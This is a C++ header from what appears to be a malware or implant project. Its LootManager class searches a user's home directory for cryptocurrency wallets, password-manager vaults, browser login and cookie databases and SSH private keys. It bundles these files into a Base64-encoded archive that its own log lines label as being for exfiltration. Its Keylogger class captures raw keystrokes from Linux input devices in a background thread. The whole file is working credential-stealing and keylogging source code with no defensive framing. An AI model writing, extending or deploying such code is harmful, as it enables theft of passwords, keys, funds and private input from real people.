#pragma once

#include "Util/SafeLogger.hpp"

#include <atomic>
#include <exception>
#include <fcntl.h>
#include <filesystem>
#include <thread>
#include <vector>
#include <string>
#include <regex>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <mutex>

namespace fs = std::filesystem;

//-------------------------------------------------
//
//-------------------------------------------------
class LootManager {
public:
    struct TargetPattern {
        std::string name;
        std::regex pattern;
    };

    //-------------------------------------------------
    //
    //-------------------------------------------------
    [[nodiscard]]
    static std::vector<fs::path> scan_for_loot() {
        std::vector<fs::path> found_files;
        std::vector<TargetPattern> targets = {
            {"Wallets",   std::regex(R"(.*wallet.*\.dat$|.*\.wallet$)", std::regex::icase)},
            {"Passwords", std::regex(R"(.*\.kdbx$|.*\.pwm$|.*\.lastpass$)", std::regex::icase)},
            {"Browser",   std::regex(R"(.*Login Data$|.*key[34]\.db$|.*cookies\.sqlite$)", std::regex::icase)},
            {"SSH Keys",  std::regex(R"(.*id_rsa$|.*id_ed25519$|.*\.pem$)", std::regex::icase)}
        };

        const char* home = std::getenv("HOME");
        std::string search_root = home ? home : "/home";

        try {
            for (const auto& entry : fs::recursive_directory_iterator(search_root, fs::directory_options::skip_permission_denied)) {
                if (not entry.is_regular_file()) continue;

                std::string filename = entry.path().filename().string();
                for (const auto& target : targets) {
                    if (std::regex_match(filename, target.pattern)) {
                        found_files.push_back(entry.path());
                        break;
                    }
                }
            }
        } catch (const std::exception& e) {
            logger::debug("Scanning file directory exception: {}", e.what());
        }

        return found_files;
    }

    //-------------------------------------------------
    //
    //-------------------------------------------------
    [[nodiscard]]
    static std::string encode_archive(const std::vector<unsigned char>& data) {
        static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string out;

        int val = 0;
        int valb = -6;
        for (unsigned char c : data) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                out.push_back(base64_chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }

        if (valb > -6) {
            out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
        }

        while (out.size() % 4) {
            out.push_back('=');
        }

        return out;
    }

    //-------------------------------------------------
    //
    //-------------------------------------------------
    [[nodiscard]]
    static std::string execute_loot_command() {
        logger::info("Starting loot scan...");
        auto files = LootManager::scan_for_loot();

        if (files.empty()) {
            logger::debug("No sensitive files found.");
            return "";
        }

        logger::debug("Found {} files for exfiltration", files.size());

        std::vector<unsigned char> archive_buffer;

        for (const auto& path : files) {
            std::ifstream file(path, std::ios::binary);

            if (not file.is_open()) {
                continue;
            }

            std::vector<unsigned char> file_data((std::istreambuf_iterator<char>(file)),
                                                std::istreambuf_iterator<char>());

            std::string path_str = path.string();
            uint32_t path_len = path_str.length();
            uint32_t data_len = file_data.size();

            // Append to buffer
            auto append_uint32 = [&](uint32_t val) {
                archive_buffer.push_back((val >> 24) & 0xFF);
                archive_buffer.push_back((val >> 16) & 0xFF);
                archive_buffer.push_back((val >> 8) & 0xFF);
                archive_buffer.push_back(val & 0xFF);
            };

            append_uint32(path_len);
            archive_buffer.insert(archive_buffer.end(), path_str.begin(), path_str.end());

            append_uint32(data_len);
            archive_buffer.insert(archive_buffer.end(), file_data.begin(), file_data.end());

            logger::debug("Added {} ({} bytes)", path.filename().string(), data_len);
        }

        logger::info("Encoding archive to Base64...");
        return encode_archive(archive_buffer);
    }
};

//-------------------------------------------------
//
//-------------------------------------------------
class Keylogger {
private:
    std::atomic<bool> running{false};
    std::thread worker;
    std::vector<std::string> key_buffer;
    std::mutex buffer_mutex;

    //-------------------------------------------------
    //
    //-------------------------------------------------
    std::string keycode_to_str(int code) {
        static const char* map[] = {
            "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE",
            "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "L_CTRL",
            "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "R_SHIFT", "KPA*", "L_ALT", "SPACE"
        };
        if (code >= 0 && code < (int)(sizeof(map) / sizeof(map[0]))) return map[code];
        return "[UNKNOWN]";
    }

    //-------------------------------------------------
    //
    //-------------------------------------------------
    void log_loop() {
        // Find the keyboard device. On many systems, /dev/input/event3 or event4.
        // A better way is to parse /proc/bus/input/devices
        int fd = open("/dev/input/event4", O_RDONLY);
        if (fd == -1) {
            fd = open("/dev/input/event3", O_RDONLY);
        }

        if (fd == -1) return;

        struct input_event ev;
        while (running) {
            if (read(fd, &ev, sizeof(struct input_event)) > 0) {
                if (ev.type == EV_KEY && ev.value == 1) {
                    std::lock_guard<std::mutex> lock(buffer_mutex);
                    key_buffer.push_back(keycode_to_str(ev.code));
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        close(fd);
    }

public:
    //-------------------------------------------------
    //
    //-------------------------------------------------
    void start() {
        if (running) return;
        running = true;
        worker = std::thread(&Keylogger::log_loop, this);
    }

    //-------------------------------------------------
    //
    //-------------------------------------------------
    void stop() {
        running = false;
        if (worker.joinable()) worker.join();
    }

    //-------------------------------------------------
    //
    //-------------------------------------------------
    std::vector<std::string> collect_and_clear() {
        std::lock_guard<std::mutex> lock(buffer_mutex);
        std::vector<std::string> output = std::move(key_buffer);
        key_buffer.clear();
        return output;
    }

    //-------------------------------------------------
    //
    //-------------------------------------------------
    bool is_running() const {
        return running;
    }
};